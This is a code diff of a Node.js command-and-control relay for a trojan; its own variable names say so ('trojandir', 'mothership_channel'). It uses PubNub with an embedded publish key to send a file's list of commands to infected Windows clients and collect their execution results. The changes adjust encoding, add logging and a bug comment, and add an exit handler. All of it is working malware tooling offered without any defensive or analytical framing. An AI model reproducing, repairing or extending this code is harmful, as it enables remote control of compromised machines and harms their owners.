@@ -24,10 +24,13 @@ function getRandomCode(n) {
 
 const enginename = 'JS'; // 'BAT'
 const trojandir = 'C:\\ProgramData\\owd\\';
-const clientid = fs.readFileSync(path.join(trojandir, 'client_id'), 'utf8');
+const clientid = fs.readFileSync(path.join(trojandir, 'client_id'), 'utf-8');
 
 let mothership_channel = `clientid_${clientid}_${enginename}_mothership`;
 let client_channel = `clientid_${clientid}_${enginename}_client`;
+
+logmsg(`mothership_channel: ${mothership_channel}`);
+logmsg(`client_channel: ${client_channel}`);
 
 const pubnub = new PubNub({
     publishKey: 'pub-c-a00eaad9-c35e-4a41-bd62-cdc619a6f2cc',
@@ -43,6 +46,7 @@ var cmdresponse = null;
 
 var cmdresponses = [];
 
+// BUG -- not able to receive any messages from client
 subscription.onMessage = (messageEvent) => {
     cmdresponse = messageEvent.message.execresult;
     cmdresponses.push(cmdresponse);
@@ -129,7 +133,8 @@ function sleepSync(ms) {
 
 let lines = [];
 
-const content = fs.readFileSync('C:\\ProgramData\\owd\\nodehostrelay.cmdslist.js', 'utf16le'); // utf16le, utf-8
+// put some basic text at beginning of file to ensure read works
+const content = fs.readFileSync('C:\\ProgramData\\owd\\nodehostrelay.cmdslist.js', 'utf-8'); // utf16le, utf-8
 const linesArray = content.split(/\r?\n/);
 lines = linesArray.filter(str => str !== "");
 ;
@@ -148,7 +153,8 @@ for ( let i = 0; i<cmds.length; i++) {
     sleepSync(1000);    
 } 
 
-while (true) {
-    logmsg('looping...');
-    sleepSync(1000);    
-}
+process.on('SIGINT', () => {
+  logmsg('\nUnsubscribing and exiting...');
+  subscription.unsubscribe();
+  process.exit();
+});
